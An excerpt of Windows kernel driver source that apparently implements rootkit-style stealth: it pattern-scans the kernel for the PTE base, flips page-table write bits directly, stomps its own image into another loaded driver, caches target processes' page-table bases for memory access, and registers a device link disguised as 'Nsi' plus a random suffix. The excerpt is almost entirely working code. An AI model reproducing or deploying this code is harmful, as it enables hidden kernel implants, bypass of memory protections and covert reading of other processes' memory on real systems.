...
// ============================================================================
// PTE manipulation — make stomped pages writable
// ============================================================================

static UINT64 g_pteBase = 0;

static UINT64 FindPteBase(PVOID ntBase) {
    // MiGetPteAddress pattern:
    //   48 C1 E9 09              shr rcx, 9
    //   48 B8 xx xx xx xx xx xx xx xx   mov rax, <PTE_BASE>
    static const UCHAR pat[] = { 0x48, 0xC1, 0xE9, 0x09, 0x48, 0xB8 };
    PUCHAR textBase; SIZE_T textSize;
    if (!GetImageSection(ntBase, ".text", &textBase, &textSize)) return 0;
    PUCHAR match = PatternScan(textBase, textSize, pat, sizeof(pat));
    if (!match) return 0;
    return *(UINT64*)(match + 6);
}

static VOID MakeRangeWritable(PVOID base, SIZE_T size) {
    if (!g_pteBase) return;
    PUCHAR start = (PUCHAR)((ULONG_PTR)base & ~0xFFFULL);
    PUCHAR end   = (PUCHAR)base + size;
    for (PUCHAR page = start; page < end; page += PAGE_SIZE) {
        UINT64 pteAddr = g_pteBase + (((UINT64)page >> 12) << 3);
        if (!MmIsAddressValid((PVOID)pteAddr)) continue;
        volatile UINT64* pte = (volatile UINT64*)pteAddr;
        UINT64 val = *pte;
        if (!(val & 2)) {  // R/W bit not set
            *pte = val | 2;
            // Flush TLB entry
            _mm_mfence();
            __invlpg(page);
...
// Make all writable sections in a stomped image actually writable at the target VA
static VOID FixStompedPageProtections(PVOID selfBase, PVOID targetBase) {
    PIMAGE_NT_HEADERS selfNt = RtlImageNtHeader(selfBase);
    if (!selfNt) return;

    if (!g_pteBase) {
        LOG("[!] PTE base not found — global writes to stomped image will fault\n");
        LOG("[!] Consider linking with /MERGE:.data=.text to make globals live in RWX .text\n");
        return;
    }

    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(selfNt);
    for (USHORT i = 0; i < selfNt->FileHeader.NumberOfSections; i++, sec++) {
        if (!(sec->Characteristics & IMAGE_SCN_MEM_WRITE)) continue;
        if (!sec->Misc.VirtualSize) continue;

        PUCHAR secStart = (PUCHAR)targetBase + sec->VirtualAddress;
        SIZE_T secSize  = sec->Misc.VirtualSize;
        MakeRangeWritable(secStart, secSize);
        LOG("[+] PTE: made writable %.8s at %p size=0x%zX\n", sec->Name, secStart, secSize);
    }
}
...
static BOOLEAN WriteStomedImageToNewFile(PVOID stageData, ULONG stageSize,
    ...
    WcsAppend(g_stompFilePath, ARRAYSIZE(g_stompFilePath), dirPath);
    WcsAppend(g_stompFilePath, ARRAYSIZE(g_stompFilePath), L"\\");
    WcsAppendN(g_stompFilePath, ARRAYSIZE(g_stompFilePath),
               targetLdr->BaseDllName.Buffer,
               targetLdr->BaseDllName.Length / sizeof(WCHAR));
...
static PVOID StompIntoTarget(PVOID ntBase, PVOID selfBase, PLDR_DATA_TABLE_ENTRY targetLdr) {
    ...
    // Fix page protections — writable sections must be writable at the target VA
    FixStompedPageProtections(selfBase, targetBase);
...
static VOID ProcessCommPacket(COMM_PACKET* pkt) {
    ...
    case COMM_OP_INIT_TARGET: {
        ...
        if (NT_SUCCESS(pkt->Status)) {
            g_cachedDirBase = *(UINT64*)((PUCHAR)g_cachedProcess + 0x28); // KPROCESS.DirectoryTableBase
    ...
    case COMM_OP_GET_BASE:
        if (!g_cachedProcess) {
            pkt->Status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)pkt->ProcessId, &g_cachedProcess);
            if (NT_SUCCESS(pkt->Status))
                g_cachedDirBase = *(UINT64*)((PUCHAR)g_cachedProcess + 0x28);
        }
        if (g_cachedProcess) {
...
extern "C" NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject,
    ...
    // Resolve PTE base for page protection fixup
    if (ntBase) g_pteBase = FindPteBase(ntBase);
    ...
    WCHAR lnkNameBuf[64] = {};
    WcsAppend(lnkNameBuf, ARRAYSIZE(lnkNameBuf), L"\\DosDevices\\Nsi");
    WcsAppendHex32(lnkNameBuf, ARRAYSIZE(lnkNameBuf), nameSeed);
